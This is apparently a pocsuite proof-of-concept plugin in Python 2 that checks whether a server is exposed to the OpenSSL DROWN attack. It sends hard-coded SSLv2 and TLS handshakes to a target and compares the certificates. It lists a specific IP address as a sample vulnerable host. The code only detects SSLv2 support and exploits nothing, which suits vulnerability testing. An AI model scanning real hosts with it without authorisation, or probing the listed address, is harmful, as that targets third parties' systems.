#!/usr/bin/env python
# -*- coding: utf-8 -*-

import socket
import urlparse

from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output
from pocsuite.api.poc import POCBase
from pocsuite.api.utils import url2ip


def check_tls(host, port):
    """
    params:
        host[str]: target host ip
        port[int]: target host port
    """
    client_hello = '16030100d8010000d403037d408377c8e5204623867604ab0ee4a140043a4e383f770a1e6b66c2d45d34e820de8656a211d79fa9809e9ae6404bb7bcc372afcdd6f51882e39ac2241a8535090016c02bc02fc00ac009c013c01400330039002f0035000a0100007500000014001200000f7777772e65746973616c61742e6567ff01000100000a00080006001700180019000b00020100002300003374000000100017001502683208737064792f332e3108687474702f312e31000500050100000000000d001600140401050106010201040305030603020304020202'

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    s.connect((host, port))
    s.send(client_hello.decode('hex'))
    try:
        data = s.recv(1024*1024)
    except socket.timeout:
        data = ''

    if data:
        server_hello_len = int(data[3:5].encode('hex'),16)
        index = 5
        index += server_hello_len
        cert_msg = data[index:]

        return cert_msg


def check_drown(host, port):
    """
    params:
        host[str]: target host ip
        port[int]: target host port
    """
    client_hello_payload = '803e0100020015001000100100800200800600400400800700c00800800500806161616161616161616161616161616161616161616161616161616161616161'
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(8)
    s.connect((host, port))

    s.sendall(client_hello_payload.decode('hex'))
    try:
        server_hello = s.recv(10*1024)
    except socket.timeout:
        #print(" [-] Not connected SSLv2")
        return False
    except socket.error:
        return False

    try:
        # parse incoming packet to extract the certificate
        index = 0
        length = server_hello[index:index+2].encode('hex')
        index += 2
        msg_type = server_hello[index].encode('hex')
        index += 1
        session_id = server_hello[index].encode('hex')
        index += 1
        cert_type = server_hello[index].encode('hex')
        index += 1
        ssl_version = server_hello[index:index+2]
        index += 2
        cert_len = int(server_hello[index:index+2].encode('hex'),16)
        #print('cert_len', cert_len)
        index += 2
        cipher_spec_len = server_hello[index:index+2]
        index += 2
        conn_id = server_hello[index:index+2]
        index += 2
        cert = server_hello[index:cert_len+1]
        data = check_tls(host, port)
        if data:
            print(" [*] Check the TLS CERT and SSLv2 CERT")
            if cert.encode('hex') in data.encode('hex'):
                print(" [+] SSLv2 Enable - Same cert")
            else:
                print(" [+] SSLv2 Enable - Not same cert")
            return True
        else:
            return False
    except Exception as e:
        # most exception is "string index out of range"
        return False

    s.close()


class OpenSSL_DROWN(POCBase):
    vulID = '0'                 # vul ID
    version = '1'
    author = 'janes'
    vulDate = '2016-03-01'
    createDate = '2017-02-16'
    updateDate = '2017-02-16'
    references = ['https://www.openssl.org/blog/blog/2016/03/01/an-openssl-users-guide-to-drown/']
    name = 'OpenSSL Drown跨协议攻击TLS漏洞 POC'
    appPowerLink = 'https://www.openssl.org'
    appName = 'OpenSSL'
    appVersion = '1.0.2a, 1.0.1.m'
    vulType = 'Information Disclosure'
    desc = '''
        DROWN漏洞主要利用SSLv2协议的脆弱性对TLS协议进行攻击。攻击者通过中间人攻击等手段截获和解密用户和服务器之间的加密通信，包括但不限于用户名和密码、信用卡号、电子邮件、即时消息，以及敏感文件。
    '''
    samples = ['50.232.43.188']

    def _verify(self):
        result = {}
        output = Output(self)

        target_ip = url2ip(self.url)
        url = urlparse.urlparse(self.url)
        port = url.port or 443

        if check_drown(target_ip, port):
            output.success(result)
        else:
            output.fail('Not support SSLv2 connection. Not Vulnerable')
        return output

    def _attack(self):
        return self._verify()


register(OpenSSL_DROWN)
